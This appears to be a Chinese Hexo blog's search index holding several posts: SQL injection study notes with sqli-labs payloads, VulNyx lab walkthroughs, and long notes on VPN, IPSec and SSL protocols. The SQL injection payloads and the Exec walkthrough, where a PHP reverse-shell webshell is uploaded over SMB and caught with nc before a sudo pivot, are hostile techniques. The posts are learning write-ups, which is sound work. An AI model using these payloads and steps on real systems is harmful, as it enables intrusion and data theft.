<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024 | 博客前传</title>
      <link href="/2023/01/14/5w2h-godweiyang/"/>
      <url>/2023/01/14/5w2h-godweiyang/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/contact.jpg" alt></p><h2 id="When？什么时候开始写的？"><a href="#When？什么时候开始写的？" class="headerlink" title="When？什么时候开始写的？"></a>When？什么时候开始写的？</h2><p>第一次写博客是 2023 年了，在 CSDN 和博客园上面，当时写文章是为了记录主要还是因为 CSDN 和博客园的体验太差了，写起文章来很难受，又丑又慢。另一个原因是， CSDN 发个文章还需要审核，定制主题自由度也太差。</p><p>第二次就是 2024 年暑假了，当时自己建了个人博客，域名是：(<a href="https://jjfacq.github.io)。当时的想法是，个人博客好好看，有各种主题，如果会点前端知识，还能自己魔改。个人博客主要更新的就是自然语言处理的知识了，主要都是些论文的阅读赏析。另外还更新一些计算机相关的基础知识，主要考虑到绝大多数人并不会对枯燥又专业的自然语言处理感兴趣。最近也开始更新起来了，主要写一些网络内容。">https://jjfacq.github.io)。当时的想法是，个人博客好好看，有各种主题，如果会点前端知识，还能自己魔改。个人博客主要更新的就是自然语言处理的知识了，主要都是些论文的阅读赏析。另外还更新一些计算机相关的基础知识，主要考虑到绝大多数人并不会对枯燥又专业的自然语言处理感兴趣。最近也开始更新起来了，主要写一些网络内容。</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入 | 渗透测试</title>
      <link href="/2023/01/14/sqlzhuru/"/>
      <url>/2023/01/14/sqlzhuru/</url>
      
        <content type="html"><![CDATA[<p> <img src="/medias/%5Cfeatureimages%5C26.jpg" alt></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>Web漏洞两大关键因素：</p><ol><li><p>参数可控<br>向应用传递的参数用户可以控制</p></li><li><p>后台执行<br>用户向应用传递了参数后，后台将参数执行</p></li></ol><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li><p>单引号，判断注入点数据类型，int、string</p></li><li><p>and或者or进行逻辑判断，是否可以执行逻辑</p></li><li><p>order by 判断有多少列</p></li><li><p>通过union select 1,2,3判断显示位，是原本的输出不影响判断</p></li><li><p>查库、表、列三级结构<br>information_schema</p><ul><li>schemata用于查询库名 schema_name</li><li>tables用于查询表名 table_name</li><li>columns用于查询列名 column_name</li></ul></li><li><p>查询列内容<br>select 列名 from 库名.表名 where 限定条件</p></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>MySQL版本5.0以下，不支持报错注入，也没有information_schema库</li><li>extractvalue() updatexml()有32位长度限制</li></ul><h2 id="为什么使用报错注入"><a href="#为什么使用报错注入" class="headerlink" title="为什么使用报错注入"></a>为什么使用报错注入</h2><ol><li>union被过滤</li><li>无论正确与否，都不显示结果</li><li>当语句错误，有错误提示 mysql_error()</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>使用length()/substr()/ascii()查询数据库名需要几步</p><ol><li>select length(database())&gt;10;//长度为8</li><li>select ascii(substr(database(),$num,1))=10;//不断的取ascii码,$num从1~8</li><li>查询</li></ol><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),1,1)) =115–+</p><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),n,1)) =ascii–+<br>变量1是n，变量2是ascii<br>n的取值范围，ascii的取值范围<br>n：1<del>8<br>ascii：97</del>122</p><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>不依赖回显，依赖于延迟</p><p>if(条件,sleep(1),sleep(2))</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>什么时候用报错注入，有mysql_error()，有报错的时候可以使用</li><li>什么时候用布尔注入，可以进行条件判断，and/or，true/false</li><li>什么时候用时间盲注，当没回显，不知道正确与否，但是执行sleep后浏览器会有延迟<br>核心：还是查询语句<br>区别：利用函数的不同，显示方式的不同</li></ol><h2 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h2><ol><li><p>DVWA网站的bind sql injection<br>低中高三个级别<br>根据已有（where）的库表结构，查列</p></li><li><p>sqli-labs的less8和less9<br>根据已有（where）的库表结构，查列</p></li><li><p>源码分析<br>截取关键语句，截图配说明</p></li></ol><h2 id="预习"><a href="#预习" class="headerlink" title="预习"></a>预习</h2><p>sqlmap使用，从github下载</p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulNyx-Exec | 靶机</title>
      <link href="/2023/01/14/wp-2/"/>
      <url>/2023/01/14/wp-2/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/%5Cfeatureimages%5C15.jpg" alt></p><h1 id="arp-scan-l扫出目标ip"><a href="#arp-scan-l扫出目标ip" class="headerlink" title="arp-scan -l扫出目标ip"></a>arp-scan -l扫出目标ip</h1><p>192.168.193.130</p><h1 id="用nmap对ip进行快速扫描端口"><a href="#用nmap对ip进行快速扫描端口" class="headerlink" title="用nmap对ip进行快速扫描端口"></a>用nmap对ip进行快速扫描端口</h1><p>-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描</p><blockquote><p>nmap -sS -sV -T5 -A -p- 192.168.193.130</p></blockquote><p>扫描出22 80 139 445端口 ，有80端口，我们可以去浏览器看看有没有http网页，发现有html网页</p><p>我们可以用smbclient来查看有什么共享的资源用</p><blockquote><p>smbclient -L //192.168.193.130</p></blockquote><p>看到有个server<br>让后可以用smbclient 与服务器进行交互连接</p><blockquote><p>smbclient //192.168.193.130/server</p></blockquote><h2 id="然后连接到smb服务器"><a href="#然后连接到smb服务器" class="headerlink" title="然后连接到smb服务器"></a>然后连接到smb服务器</h2><h2 id="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个"><a href="#然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个" class="headerlink" title="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个"></a>然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个</h2><p>反弹webshell的a.php文件木马，</p><blockquote><p>/usr/share/webshells/php/php-reverse-shell a.php</p></blockquote><p>让后用连接的smb把木马文件上传</p><blockquote><p>put a.php</p></blockquote><h2 id="上传木马后，我们用nc-lp-1234-对目标进行监听"><a href="#上传木马后，我们用nc-lp-1234-对目标进行监听" class="headerlink" title="上传木马后，我们用nc -lp 1234 对目标进行监听"></a>上传木马后，我们用nc -lp 1234 对目标进行监听</h2><p>然后我们去浏览器，访问一下我们上传的木马<br>把shell反弹过来</p><blockquote><p>192.168.193.130/a.php<br>让后监听成功，可以用/usr/bin/script -qc /bin/bash /dev/null这个命令进入shell模式<br>/usr/bin/script -qc /bin/bash /dev/null</p></blockquote><p>然后我们使用</p><blockquote><p>sudo -l<br>看下换个身份执行命令看到（s3cur4）这个用户<br>然后我们用这个用户执行命令<br>sudo -us3cur4 bash</p></blockquote><h2 id="然后我们cd到家目录"><a href="#然后我们cd到家目录" class="headerlink" title="然后我们cd到家目录"></a>然后我们cd到家目录</h2><blockquote><p>cd<br>ls<br>cat user.txt<br>看一下文件内容夺取成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 靶机打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 | 网络安全</title>
      <link href="/2023/01/14/lwaq/"/>
      <url>/2023/01/14/lwaq/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/%5Cfeatureimages%5C14.jpg" alt></p><h1 id="VPN-技术"><a href="#VPN-技术" class="headerlink" title="VPN 技术"></a>VPN 技术</h1><p>l VPN定义：虚拟专用网(Virtual Private Network)是一种“通过共享的公共网络建立私有的数据通道，将各个需要接入这张虚拟网的网络或终端通过通道连接起来，构成一个专用的、具有一定安全性和服务质量保证的网络 ”</p><p>​    </p><p>用户不再需要拥有实际的专用长途数据线路，而是利用Internet的长途数据线路建立自己的私有网络 </p><h2 id="VPN常见技术：5"><a href="#VPN常见技术：5" class="headerlink" title="VPN常见技术：5"></a>VPN常见技术：5</h2><p>VPN还需采取其他技术保证数据的安全性，主要包括加解密技术、密钥管理技术、 数据认证技术和身份认证技术、隧道技术等。</p><h2 id="l-隧道技术"><a href="#l-隧道技术" class="headerlink" title="l 隧道技术"></a>l 隧道技术</h2><p>隧道技术是VPN技术中最关键的技术。隧道技术是指在隧道的两端通过封装以及解封装技术在公网上建立一条数据通道，使用这条通道对数据报文进行传输。隧道是由隧道协议形成的，分为第二、三层隧道协议。二层隧道协议，使用二层网络协议进行传输，它主要应用于构建远程访问虚拟专网，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；三层隧道协议，用于传输三层网络协议，它主要应用于构建企业内部虚拟专网和扩展的企业内部虚拟专网，主要的第三层隧道协议有GRE、IPSec等。IPSec（IP Security）由多个协议组成，并通过这个协议集来提供安全协议选择、安全算法，确定服务所使用密钥等服务，从而在IP层提供安全保障。</p><h2 id="l-数据认证技术和身份认证技术"><a href="#l-数据认证技术和身份认证技术" class="headerlink" title="l 数据认证技术和身份认证技术"></a>l 数据认证技术和身份认证技术</h2><p>数据认证技术主要保证数据在网络传输过程中不被非法篡改。数据认证技术主要采用哈希算法，由于哈希算法的不可逆特性以及理论上的结果唯一性，因此在摘要相同的情况下可以保证数据没被篡改过。</p><p>身份认证技术主要保证接入VPN的操作人员的合法性以及有效性，主要采用“用户名密码”方式进行认证，对安全性较高的还可以使用USB KEY等认证方式。</p><h2 id="l-加解密技术"><a href="#l-加解密技术" class="headerlink" title="l 加解密技术"></a>l 加解密技术</h2><p>加解密技术是数据通信中一项较成熟的技术，VPN技术可以借助加解密技术保证数据在网络中传输时不被非法获取。即当数据被封装入隧道后立即进行加密，只有当数据到达隧道对端后，才能由隧道对端对数据进行解密。</p><h5 id="隧道是由隧道协议形成的，分为第二、三层隧道协议。二层隧道协议，使用二层网络协议进行传输，它主要应用于构建远程访问虚拟专网，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；三层隧道协议，用于传输三层网络协议，它主要应用于构建企业内部虚拟专网和扩展的企业内部虚拟专网，主要的第三层隧道协议有GRE、IPSec等。"><a href="#隧道是由隧道协议形成的，分为第二、三层隧道协议。二层隧道协议，使用二层网络协议进行传输，它主要应用于构建远程访问虚拟专网，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；三层隧道协议，用于传输三层网络协议，它主要应用于构建企业内部虚拟专网和扩展的企业内部虚拟专网，主要的第三层隧道协议有GRE、IPSec等。" class="headerlink" title="隧道是由隧道协议形成的，分为第二、三层隧道协议。二层隧道协议，使用二层网络协议进行传输，它主要应用于构建远程访问虚拟专网，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；三层隧道协议，用于传输三层网络协议，它主要应用于构建企业内部虚拟专网和扩展的企业内部虚拟专网，主要的第三层隧道协议有GRE、IPSec等。"></a>隧道是由隧道协议形成的，分为第二、三层隧道协议。<strong>二层</strong>隧道协议，使用二层网络协议进行传输，它主要应用于<strong>构建远程访问虚拟专网</strong>，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；<strong>三层</strong>隧道协议，用于传输三层网络协议，它主要应用于<strong>构建企业内部虚拟专网和扩展的企业内部虚拟专网</strong>，主要的第三层隧道协议有GRE、IPSec等。</h5><h4 id="凯撒加密法，双轨加密法"><a href="#凯撒加密法，双轨加密法" class="headerlink" title="凯撒加密法，双轨加密法"></a>凯撒加密法，双轨加密法</h4><p>加密技术有四个要素：明文（Plaintext）、密钥（Key）、加密算法（Encrypt）、密文（Ciphertext）。</p><p>加密算法的表达式为：C=En（K，P）</p><h5 id="密码技术可以看作是一个复杂的函数变换，-C代表密文，即加密后得到的字符序列；P代表明文即待加密的字符序列，K表示密钥，En表示加密算法，是秘密选定的一个字符序列。"><a href="#密码技术可以看作是一个复杂的函数变换，-C代表密文，即加密后得到的字符序列；P代表明文即待加密的字符序列，K表示密钥，En表示加密算法，是秘密选定的一个字符序列。" class="headerlink" title="密码技术可以看作是一个复杂的函数变换， C代表密文，即加密后得到的字符序列；P代表明文即待加密的字符序列，K表示密钥，En表示加密算法，是秘密选定的一个字符序列。"></a>密码技术可以看作是一个复杂的函数变换， C代表密文，即加密后得到的字符序列；P代表明文即待加密的字符序列，K表示密钥，En表示加密算法，是秘密选定的一个字符序列。</h5><h5 id="什么是加密：明文按照某种算法转换为密文的过程"><a href="#什么是加密：明文按照某种算法转换为密文的过程" class="headerlink" title="什么是加密：明文按照某种算法转换为密文的过程"></a><strong>什么是加密：</strong>明文按照某种算法转换为密文的过程</h5><h5 id="明文："><a href="#明文：" class="headerlink" title="明文："></a>明文：</h5><p>密文：</p><p>密码提供的服务有：1.机密性、2.完整性、3.可用性、4.抗抵赖性：</p><h1 id="加密技术分类"><a href="#加密技术分类" class="headerlink" title="加密技术分类"></a><strong>加密技术分类</strong></h1><p>根据密钥分类：</p><p>l 密钥：私钥、公钥</p><p>l 对称加密：加密、解密用同一个密钥</p><p>l 非对称加密：在加密和解密中使用两个不同的密钥，私钥用来保护数据，公钥则由同一系统的人公用，用来检验信息及其发送者的真实性和身份。</p><p><strong>对称加密的安全使用有两个要求：</strong></p><p>l 需要一个强（strong）加密算法：密钥要足够强壮，使得攻击者不能通过已有的明文和密文对应来破解。</p><p>l 密钥的传递需要一个安全的方式：要求发送者要把密钥通过安全的方式告诉接收者，不能让第三方知道。</p><p><strong>常见的对称分组加密算法：</strong></p><p>p DES：输入的明文为64位，密钥为56位，生成的密文为64位</p><p>p 3DES：</p><p>p AES：相比较而言，DES和3DES加密速度比较慢，AES采用128位的分组长度，支持长度为128位、192位和256位的密钥长度，并可支持不同的平台。128位的密钥长度能够提供足够的安全性，而且比更长的密钥需要较少的处理时间。到目前为止，AES还没有出现任何致命缺陷。AES取代DES和3DES以增强安全性和效率已是大势所趋。</p><p>p IDEA：输入明文为64位，密钥为128位，生成的密文为64位；PGP中已实现了IDEA</p><p>p RC2，RC5，RC6</p><p><strong>对称密钥算法的优缺点**</strong>：**</p><p>对称密钥的主要优点在于速度快，通常比非对称密钥快100倍以上，而且可以方便地通过硬件实现。</p><p>其主要缺点在于密钥的管理复杂和缺乏抗抵赖性。由于每对通信者间都需要一个不同的密钥，N个人通信需要n（n-1）/2密钥；同时如何安全的传递秘密密钥给信息接收方成为最大的问题；并且由于没有签名机制，因此也不能实现抗抵赖问题，即通信双方都可以否认发送或接收过的信息。</p><p><strong>对称与非对称算法对比</strong></p><p>l 对称密钥算法：常用于数据量大的数据的加密</p><p>p 优点：加解密速度快</p><p>p 缺点：密钥分发问题</p><p>l 非对称密钥算法：常用于数据量小的加密（数字签名，小量数据传输加密）</p><p>p 优点：密钥安全性高</p><p>p 缺点：加解密对速度敏感</p><p>对称和非对称密钥算法通常结合使用，用于密钥加密和数字签名，即实现安全又能优化性能。</p><p>散列：保证数据的完整性（MD5,SHA）</p><p><strong>数字签名：私钥加密，公钥解密</strong></p><p><strong>密钥交换的过程</strong></p><p>如发小量数据给A，则用A的公钥加密，A收到后用其私钥解密。</p><p>密钥管理技术：密钥产生，分配保存，更换与销毁</p><h2 id="VPN-分类："><a href="#VPN-分类：" class="headerlink" title="VPN**分类：**"></a><strong>VPN**</strong>分类：**</h2><p>l 按业务用途划分：Access VPN—远程接入VPN，Intranet VPN，Extranet VPN</p><p>l 按实现层次分：第2层VPN (PPTP,L2F,L2TP)；第3层VPN(GRE,IPSEC),应用层的VPN（SSL VPN）</p><h3 id="7-L2TP-VPN技术-1701"><a href="#7-L2TP-VPN技术-1701" class="headerlink" title="\7. L2TP VPN技术  1701"></a>\7. L2TP VPN技术  1701</h3><p>l L2TP (Layer Two Tunneling Protocol) 二层隧道协议</p><p>p 为在用户和企业的服务器之间透明传输PPP报文而设置的隧道协议。提供了对PPP 链路层数据包的通道（Tunnel）传输支持。</p><p>p 结合了L2F 协议和PPTP 协议的各自优点，成为IETF 有关二层隧道协议的工业标准。 </p><h4 id="l-主要用途"><a href="#l-主要用途" class="headerlink" title="l 主要用途"></a>l 主要用途</h4><p>p 企业驻外机构和出差人员可从远程经由公共网络，通过虚拟隧道实现和企业总部之间的网络连接</p><p>二层隧道协议特征：身份验证，多协议传输，支持RADIUS，内部地址分配，</p><p>计费灵活，可靠</p><p>L2TP数据消息：为PPP报文。同一隧道内可有多个会话，即多个业务</p><p>LNS发往LAC的报文封装和解封装过程和上面类似，主要区别是LAC解封装过程中将公网IP头、UDP头和L2TP头解封装以后，不再解封装PPP头，而是直接将PPP报文通过PPP Session发往Client。</p><p>L2TP消息：控制消息，数据消息</p><p>控制消息：用于隧道和回话的建立、维护及传输控制</p><p>数据消息：用于封装PPP帧并在隧道上传输</p><p>L2TP方式：<strong>Client-Initialized**</strong>方式<strong><strong>L2TP</strong></strong>，<strong><strong>NAS-Initialized</strong></strong>方式<strong>**L2TP</strong></p><h2 id="GRE-VPN-实训题"><a href="#GRE-VPN-实训题" class="headerlink" title="GRE VPN  实训题"></a>GRE VPN  实训题</h2><p>l GRE 提供了将一种协议的报文封装在另一种协议报文中的机制，使报文能够在<strong>异种网络</strong>中传输，异种报文传输的通道称为tunnel(判断)</p><p><strong>相关的概念解释如下：</strong></p><p>l 载荷（Payload）：系统收到的需要封装和路由的数据报称为载荷。</p><p>l 乘客协议（Passenger Protocol）：封装前的报文协议称为乘客协议。</p><p>l 封装协议（Encapsulation Protocol）：上述的GRE协议称为封装协议，也称为运载协议（Carrier Protocol）</p><p>l 传输协议（Transport Protocol或者Delivery Protocol）：负责对封装后的报文进行转发的协议称为传输协议。</p><h3 id="GRE特点："><a href="#GRE特点：" class="headerlink" title="GRE特点："></a>GRE特点：</h3><p>p 机制简单，对隧道两端设备的CPU负担小。</p><p>p 本身不提供数据的加密。</p><p>p 不对数据源进行验证</p><p>p 不保证报文正确到达目的地</p><p>p 不提供流量控制和QoS特性</p><p>p 多协议的本地网可以通过单一协议的骨干网实现传输</p><p>p 将一些不能连续的子网连接起来，用于组建VPN</p><p>GRE的实现–隧道接口包含以下元素：（<strong>程序</strong>）</p><p>p 源地址：报文传输协议中的源地址。从负责封装后报文传输的网络来看，隧道的源地址就是实际发送报文的接口IP地址。</p><p>p 目的地址：报文传输协议中的目的地址。从负责封装后报文传输的网络来看，隧道本端的目的地址就是隧道目的端的源地址。</p><p>p 隧道接口IP地址：为了在隧道接口上启用动态路由协议，或使用静态路由协议发布隧道接口，要为隧道接口分配IP地址。隧道接口的IP地址可以不是公网地址，甚至可以借用其他接口的IP地址以节约IP地址。但是当Tunnel接口借用IP地址时，由于Tunnel接口本身没有IP地址，无法在此接口上启用动态路由协议，必须配置静态路由或策略路由才能实现路由器间的连通性。</p><p>p 封装类型：隧道接口的封装类型是指该隧道接口对报文进行的封装方式。一般情况下有四种封装方式，分别是GRE、MPLS TE、IPv6-IPv4 和IPv4-IPv6。</p><p>经过手工配置，成功建立隧道之后，就可以将隧道接口看成是一个物理接口，可以在其上运行动态路由协议或配置静态路由。</p><p>GRE报文的目的协议字段值为47</p><p>​            </p><h2 id="9．IPSec-VPN"><a href="#9．IPSec-VPN" class="headerlink" title="9．IPSec VPN"></a>9．IPSec VPN</h2><p>IPSec特性：机密性，完整性，真实性，防重放</p><p>IPSec端到端应用场景：安全网关之间，主机与安全网关之间，主机与主机之间</p><p>IPSec VPN体系结构：AH协议，ESP协议，IKE协议</p><p>l AH协议51：AH是报文头验证协议，主要提供的功能有数据源验证、数据完整性校验和防报文重放功能。然而，AH并不加密所保护的数据报。</p><p>l ESP协议50：ESP是封装安全载荷协议。它除提供AH协议的所有功能外（但其数据完整性校验不包括IP头），还可提供对IP报文的加密功能。</p><p>l IKE协议：IKE协议用于自动协商AH和ESP所使用的密码算法</p><p>OR</p><p>l AH（Authentication Header）报文头验证协议，主要提供的功能有数据源验证、数据完整性校验和防报文重放功能；然而，AH并不加密所保护的数据报文。</p><p>l ESP（Encapsulating Security Payload）ESP是封装安全载荷协议。它除提供AH协议的所有功能外（但其数据完整性校验不包括IP头），还可提供对IP报文的加密功能。</p><h2 id="IPSec协议封装模式：传输模式，隧道模式"><a href="#IPSec协议封装模式：传输模式，隧道模式" class="headerlink" title="IPSec协议封装模式：传输模式，隧道模式"></a>IPSec协议封装模式：传输模式，隧道模式</h2><p>l 传输模式（Transport Mode）：</p><p>1）应用场景1：主机与网络安全网关之间的通信；</p><p>2）应用场景2：主机与主机之间的通信。</p><p>l 隧道模式（Tunnel Mode）：</p><p>1）应用场景：网络安全网关之间的通信。</p><p>在传输模式下，IPSec头被插入到IP头之后但在所有传输层协议之前，或所有其他IPSec协议之前。</p><p>l 在隧道模式下， IPSec头插在原始IP头之前，另外生成一个新的报文头放到AH或ESP之前。</p><p><img src="file:///C:/Users/jfq/AppData/Local/Temp/msohtmlclip1/01/clip_image001.gif" alt="img"></p><h2 id="l-封装模式对比："><a href="#l-封装模式对比：" class="headerlink" title="l 封装模式对比："></a>l 封装模式对比：</h2><p>p 安全性：</p><p>n 隧道模式隐藏原IP头信息，安全性更好。</p><p>p 性能：</p><p>n 隧道模式有一个额外的IP头，隧道模式比传输模式占用更多带宽。</p><p>p 具体选择那封装模式，需要在性能和安全之间做权衡 。</p><h2 id="IPSec-VPN加密和验证算法"><a href="#IPSec-VPN加密和验证算法" class="headerlink" title="IPSec VPN加密和验证算法"></a>IPSec VPN加密和验证算法</h2><p>l 加密算法</p><p>p DES ( 56bità64bit )</p><p>p 3DES( 3个 56bit à64bit ) </p><p>p AES (128、192、256)</p><p>p  国密(256)</p><p>l 验证算法</p><p>p  MD5( 128bit )</p><p>p  SHA-1( 160bit )</p><p>l AH在IP报文头中的协议号为51</p><p>p 传输模式: 验证整个IP报文</p><p>p 隧道模式: 验证新IP头及整个IP报文</p><p><img src="file:///C:/Users/jfq/AppData/Local/Temp/msohtmlclip1/01/clip_image010.gif" alt="img"></p><h2 id="l-ESP在IP报头中的协议号为50"><a href="#l-ESP在IP报头中的协议号为50" class="headerlink" title="l ESP在IP报头中的协议号为50"></a>l ESP在IP报头中的协议号为50</h2><p>p 传输模式: ESP报头位于IP报头和传输层协议报头之间，在数据后面增加ESP尾</p><p>p 隧道模式: ESP报头位于新IP头和初始报文之间，在数据后面增加ESP尾。</p><p>IKE的安全机制：DH算法、密钥分发；前向安全性；身份验证；身份保护（及解释，作用）</p><p>SA（安全联盟）由三元组来唯一标识 ，包括安全参数索引 、目的IP地址、安全协议号 </p><p>IKE使用了两个阶段为IPSec进行密钥协商并建立安全联盟：</p><p>p 第一阶段，通信各方彼此间建立了一个已通过身份验证和安全保护的隧道，即IKE SA。协商模式包括<strong>主模式、野蛮模式</strong>。认证方式包括预<strong>共享密钥、数字签名方式、公钥加密。</strong></p><p>p 第二阶段，用在第一阶段建立的安全隧道为IPSec协商安全服务，建立IPSec SA。IPSec SA用于最终的IP数据安全传送。协商模式为<strong>快速模式</strong>。</p><p>IKE 第一阶段的协商可以采用两种模式：主模式（Main Mode，6次握手）和野蛮模式（Aggressive Mode，3次握手）。第二阶段协商模式――快速模式</p><h2 id="IKE主模式和野蛮模式区别"><a href="#IKE主模式和野蛮模式区别" class="headerlink" title="IKE主模式和野蛮模式区别"></a>IKE主模式和野蛮模式区别</h2><p>l 交换的消息:</p><p>p 主模式为6个，野蛮模式为3个。</p><p>l 身份保护：</p><p>p 主模式的最后两条消息有加密，可以提供身份保护功能；而野蛮模式消息集成度过高，因此无身份保护功能</p><p>l 对等体标识:</p><p>p 主模式只能采用IP地址方式标识对等体；而野蛮模式可以采用IP地址方式或者Name方式标识对等体。</p><h2 id="IPSec流量处理"><a href="#IPSec流量处理" class="headerlink" title="IPSec流量处理"></a>IPSec流量处理</h2><p>l 出站与入站</p><p>p 丢弃报文</p><p>p 绕过安全服务（访问外网INTERNET）</p><p>p 应用安全服务(进入IPSec VPN）</p><h2 id="10．SSL-VPN"><a href="#10．SSL-VPN" class="headerlink" title="10．SSL VPN"></a>10．SSL VPN</h2><p>SSL协议的位置？</p><p>SSL协议从以下方面确保了数据通信的安全（含解释）</p><p>p 身份认证 </p><p>n 在建立SSL连接之前，客户端和服务器之间需要进行身份认证，认证采用数字证书，可以是客户端对服务器的认证，也可以是双方进行双向认证。</p><p>p 机密性</p><p>n 采用加密算法对需要传输的数据进行加密。</p><p>p 完整性</p><p>n 采用数据鉴别算法，验证所接收的数据在传输过程中是否被修改。</p><p>SSL协议过程通过3个元素来完成</p><p>p 握手协议</p><p>p 记录协议</p><p>p 警告协议</p><p>SSL采用会话恢复的方式来减少SSL握手过程中造成的巨大开销。（什么时候使用）</p><p>SSL VPN功能技术：领先的虚拟网关；Web代理；文件共享；端口代理；网络扩展；用户安全控制；完善的日志功能</p><p>Web代理有两种实现方式： Web-link（active x）和Web改写(改链接回）</p><h2 id="文件共享：支持SMB协议；NFS协议"><a href="#文件共享：支持SMB协议；NFS协议" class="headerlink" title="文件共享：支持SMB协议；NFS协议"></a>文件共享：支持SMB协议；NFS协议</h2><h2 id="文件共享实现过程："><a href="#文件共享实现过程：" class="headerlink" title="文件共享实现过程："></a><strong>文件共享实现过程：</strong></h2><p>l 以访问内网Windows文件服务器为例：</p><p>p 客户端向内网文件服务器发起HTTPS格式的请求，发送到SVN；</p><p>p SVN将HTTPS格式的请求报文转换为SMB格式的报文；</p><p>p SVN发送SMB格式的请求报文给文件服务器。</p><p>p 文件服务器接受请求报文，将请求结果发送给SVN，用的是SMB报文；</p><p>p SVN将SMB应答报文转换为HTTPS格式；</p><p>p 将请求结果（HTTPS格式）发送到客户端；</p><p><img src="file:///C:/Users/jfq/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif" alt="img"></p><p>文件共享应用特点：所有文件接入需要认证，所有文件传输采用SSH加密，文件级的访问权限控件，SVN增加额外的访问控制</p><p>端口转发提供丰富的内网TCP应用服务</p><p>p 广泛支持静态端口的TCP应用</p><p>n 单端口单服务器（如：Telnet，SSH，MS RDP，VNC等）</p><p>n 单端口多服务器（如： Lotus Notes）</p><p>n 多端口多服务器（如： Outlook ）</p><p>p 支持动态端口的TCP应用</p><p>n 动态端口（如： FTP，Oracle）</p><p>p 提供端口级的访问控制</p><h2 id="网络扩展："><a href="#网络扩展：" class="headerlink" title="网络扩展："></a>网络扩展：</h2><p>p 实现方式：</p><p>n ActiveX控件；</p><p>n 专用客户端软件：一次安装，零配置；</p><p>p 访问方式（其区别）</p><p>n 全通道（Full Tunnel）－－ 只允许访问企业内网；</p><p>n 分离通道（Split Tunnel ）－－ 可同时访问企业内网和本地子网；</p><p>n 手动（Manual Tunnel ）－－ 可访问内网特定网段的资源</p><h2 id="VPN的密钥及图（非对称加密专，密钥交换等"><a href="#VPN的密钥及图（非对称加密专，密钥交换等" class="headerlink" title="VPN的密钥及图（非对称加密专，密钥交换等"></a>VPN的密钥及图（非对称加密专，密钥交换等</h2>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulNyx-yourWAFL | 靶机</title>
      <link href="/2023/01/14/yourwafl/"/>
      <url>/2023/01/14/yourwafl/</url>
      
        <content type="html"><![CDATA[<pre><code>arp-scan -l</code></pre><p>扫除目标ip</p><p>rustscan</p><pre><code>rustscan -a x.x.x.x -- -sV -sC</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240615002211131.png" alt></p><p>看到个3000端口，试了一下好像是进不去的</p><p>我们查看一下web请求</p><p>curl x.x.x.x -I</p><p><img src="/medias/%5Cfeatureimages%5Cimage-20240615003156838.png" alt></p><p>看到是302响应跳转 我们需要在/etc/hosts 下修改IP  domain</p><pre><code>vi /etc/hosts</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240615003438025.png" alt></p><h4 id="然后这边子域名扫描"><a href="#然后这边子域名扫描" class="headerlink" title="然后这边子域名扫描"></a>然后这边子域名扫描</h4><pre><code>ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &#39;http:www.yourwaf.nyx&#39; -H &quot;Host: FUZZ.yourwaf.nyx&quot; -H &quot;X-Originating-IP:127.0.0.1&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;X-Remote-IP: 127.0.0.1&quot; --fc 302,403 -H &#39;User-Agent: Mozilla&#39;</code></pre><p>扫描出问题的话可以去看一下ffuf工具文档地址<a href="https://github.com/ffuf/ffuf" target="_blank" 